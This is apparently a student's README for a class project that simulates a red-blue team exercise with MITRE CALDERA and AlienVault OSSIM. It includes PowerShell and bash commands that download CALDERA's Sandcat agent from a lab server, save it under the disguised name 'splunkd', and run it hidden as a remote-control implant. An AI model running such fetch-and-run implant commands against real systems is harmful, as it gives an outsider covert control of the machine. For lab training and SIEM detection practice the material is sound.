# Cybersecurity
This repository will contain our final project for our cybersecurity class. We will show the command, and mostly the screenshot and the report of our overall project.


Our final project title is: Red-Blue Team Simulation with OSSIM SIEM


In this project, we utilize MITRE CALDERA and Alien Vault OSSIM to create a simulation of an attack to our computer. We utlized some of the Caldera attack capability to gather data and information of our target while monitoring the network by utilizing the Alien Vault OSSIM. 

Caldera - An attack and defense simulation game in Linux which consists of two teams

Red Team - Attacking the victim computer

Blue Team - Defending the victim computer


OSSIM - Security Information and Event Management to track the events going on with the victim


Code below show the powershell script that we would need to run on an elevated privilage (run as administrator)
```powershell
$server="http://192.168.0.142:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
```

Below is the code that we run on linux victim machine
```bash
server="http://192.168.0.142:8888/";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v
```
